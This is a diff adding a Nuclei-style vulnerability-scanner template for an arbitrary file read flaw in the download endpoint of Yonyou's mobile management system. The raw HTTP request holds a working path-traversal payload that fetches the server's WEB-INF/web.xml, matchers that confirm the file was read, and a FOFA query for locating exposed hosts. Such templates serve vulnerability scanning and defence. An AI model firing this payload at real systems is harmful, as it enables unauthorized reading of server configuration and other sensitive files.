@@ -1,0 +1,32 @@
+id: mobile_download_read_file
+info:
+  name: 用友移动系统download_read_file
+  author: mike
+  severity: info
+  description: 用友移动管理系统的download接口存在任意文件读取漏洞，攻击者可以利用该漏洞读取服务器上的敏感文件。
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-移动系统管理"
+http:
+  - raw:
+      - |
+        GET /mobsm/common/download?path=\..\webapps\nc_web\WEB-INF\web.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <servlet-name>
+      - type: word
+        part: body
+        words:
+          - <?xml
+      - type: word
+        part: header
+        words:
+          - '200'
